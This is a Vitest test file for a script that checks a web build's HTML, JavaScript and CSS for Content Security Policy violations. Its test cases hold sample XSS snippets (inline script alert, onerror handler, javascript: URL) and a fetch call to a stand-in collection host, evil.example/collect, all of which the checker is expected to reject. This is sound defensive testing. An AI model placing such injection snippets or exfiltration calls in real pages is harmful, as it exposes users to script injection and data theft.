// @vitest-environment node
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { checkCss, checkDist, checkHtml, checkJs } from '../scripts/check-csp.mjs';

const dirs = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function fakeDist(files) {
  const dir = mkdtempSync(join(tmpdir(), 'csp-'));
  dirs.push(dir);
  for (const [name, content] of Object.entries(files)) {
    const p = join(dir, name);
    mkdirSync(join(p, '..'), { recursive: true });
    writeFileSync(p, content);
  }
  return dir;
}

const GOOD_HTML = '<!doctype html><html><head><title>x</title><link rel="stylesheet" href="/assets/a.css"></head><body><div id="app"></div><script type="module" src="/assets/a.js"></script></body></html>';

describe('check-csp', () => {
  it('accepts a clean build', () => {
    const dir = fakeDist({ 'index.html': GOOD_HTML, 'assets/a.js': 'export const a = 1; // https://www.w3.org/2000/svg', 'assets/a.css': 'body{color:red}' });
    expect(checkDist(dir)).toEqual([]);
  });

  it.each([
    ['inline script', '<script>alert(1)</script>'],
    ['inline module script', '<script type="module">import("/a.js")</script>'],
    ['inline style element', '<style>body{}</style>'],
    ['style attribute', '<div style="color:red"></div>'],
    ['inline event handler', '<img src="/x.png" onerror="x()">'],
    ['javascript url', '<a href="javascript:void(0)">x</a>'],
    ['external script', '<script src="https://cdn.example.com/a.js"></script>'],
    ['external stylesheet', '<link rel="stylesheet" href="//fonts.example.com/a.css">'],
  ])('rejects %s in index.html', (_name, snippet) => {
    expect(checkHtml('index.html', `<html><body>${snippet}</body></html>`).length).toBeGreaterThan(0);
  });

  it('rejects eval, new Function, setAttribute style and external URLs in JavaScript', () => {
    expect(checkJs('a.js', 'eval("1")')).toHaveLength(1);
    expect(checkJs('a.js', 'const f = new Function("return 1")')).toHaveLength(1);
    expect(checkJs('a.js', 'el.setAttribute("style","x")')).toHaveLength(1);
    expect(checkJs('a.js', 'fetch("https://evil.example/collect")')).toHaveLength(1);
    expect(checkJs('a.js', 'const retrieval = x.eval; obj.evaluate(1)')).toEqual([]); // not eval(
  });

  it('rejects data URLs and external imports in CSS', () => {
    expect(checkCss('a.css', 'a{background:url(data:image/png;base64,AAAA)}')).toHaveLength(1);
    expect(checkCss('a.css', '@import url("https://fonts.googleapis.com/css");')).toHaveLength(2);
    expect(checkCss('a.css', 'a{background:url(//x.example/a.png)}')).toHaveLength(1);
    expect(checkCss('a.css', 'a{color:red}')).toEqual([]);
  });

  it('walks nested asset folders and fails when index.html is missing', () => {
    const dir = fakeDist({ 'index.html': GOOD_HTML, 'assets/deep/b.js': 'eval("x")' });
    expect(checkDist(dir).join('\n')).toContain('assets/deep/b.js');
    expect(checkDist(fakeDist({ 'x.txt': 'x' }))[0]).toContain('no index.html');
  });
});
